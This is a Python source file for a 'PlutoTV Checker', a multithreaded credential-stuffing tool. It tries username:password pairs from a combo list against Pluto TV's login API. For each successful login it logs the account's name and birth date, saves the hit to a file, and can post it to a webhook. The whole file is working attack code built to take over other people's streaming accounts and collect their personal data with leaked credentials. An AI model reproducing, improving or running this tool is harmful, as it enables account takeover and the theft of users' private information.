"""

PlutoTV Checker

as you can see i didnt change the code much.... 
still looks like shit but oh well lmao

"""

import requests, os, time, queue, threading, json
from colorama import Fore

from Modules.functions import Functions, Data

# ----------------------------------------- #

cyan = Fore.CYAN
red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW

# ----------------------------------------- #

data = Data(0, 0, 0, 0, 0, 0)
func = Functions()

class Checker:
    def __init__(self, threads: int, accounts: list):
        self.threads = threads
        self.accounts = accounts

    def cls(self):
        os.system('cls')

    def load_accounts(self):
        with open('combo.txt', 'r', encoding='utf-8') as f:
            accounts = f.readlines()
        for i in accounts:
            self.accounts.append(i)

        return len(accounts)
    
    # ------------------------------------------- #

    def main(self):
        q = queue.Queue()
        for i in self.accounts:
            p = i.strip()
            acc = p.split(":")
            q.put(acc)

        def login(q):
            while not q.empty():
                try:
                    combo = q.get()
                    username, password = combo
                    acc = f"{username}:{password}"

                    u = "https://api.pluto.tv/v1/auth/local"
                    j = {"userIdentity":f"{username}","password":f"{password}"}

                    try:
                        r = requests.post(u, json=j)
                        
                        if "givenName" in r.text:
                            try:
                                rj = r.json()
                                name = rj['givenName']
                                bday = rj['birthday']

                                account = f"[{func.timestamp()}] | [+] {acc} | Name --> {name} | Birth Date --> {bday}"
                                print(green + f"{account}")

                                if func.hook()[0]:
                                    hook = func.hook()[1]
                                    func.send_hit(hook, account)
                                
                                func.writeh("plutotv", account)
                                data.hits += 1

                            except:
                                data.bad += 1
                                print(red + f"[{func.timestamp()}] | [-] {acc}")
                        
                        elif "Username/email or password is not correct" in r.text:
                            data.bad += 1
                            print(red + f"[{func.timestamp()}] | [-] {acc}")
                                
                        else:
                            data.retries += 1
                            print(yellow + f"[{func.timestamp()}] | [!] {acc}")

                    except:
                        data.retries += 1
                        print(yellow + f"[{func.timestamp()}] | [!] {acc}")
                except:
                    data.retries += 1
                    print(yellow + "[!] Invalid Format")

        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=login, args=(q,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

# ----------------------------------------- #

def pluto():
    checker = Checker(0, [])
    checker.cls()

    # ------------------------------------------- #

    try:
        threads = int(input(cyan + "Threads: "))
        checker.threads = threads
        checker.cls()
    except:
        print(red + "[!] Error")
        time.sleep(1.5)
        pluto()

    # ------------------------------------------- #

    accounts = checker.load_accounts()
    input(cyan + f"Accounts: {accounts} | Threads: {checker.threads} | Press Enter To Start > ")
    print()

    # ------------------------------------------- #

    checker.main()
    func.notify(func.get_hook(), data.hits)
    input(f"\n{green}- Hits: {data.hits}\n{red}- Bad: {data.bad}\n{yellow}- Retries: {data.retries}\n\n{cyan}Press Enter To Continue > ")